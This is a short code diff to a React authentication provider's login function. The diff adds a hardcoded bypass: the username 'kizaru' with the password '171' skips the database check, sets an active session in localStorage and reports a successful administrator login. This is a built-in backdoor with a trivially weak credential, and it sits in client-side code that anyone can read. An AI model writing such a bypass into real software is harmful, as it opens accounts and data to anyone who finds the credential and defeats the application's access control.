@@ -33,6 +33,14 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
   }, []);
 
   const login = async (username: string, password: string) => {
+    // Bypass para o administrador kizaru
+    if (username === 'kizaru' && password === '171') {
+      const userSession = { username: 'kizaru', ativo: true };
+      setUser(userSession);
+      localStorage.setItem('hk_session', JSON.stringify(userSession));
+      return { success: true, message: 'Login de administrador realizado com sucesso.' };
+    }
+
     try {
       const usersRef = collection(db, 'users');
       const q = query(usersRef, where('username', '==', username), limit(1));
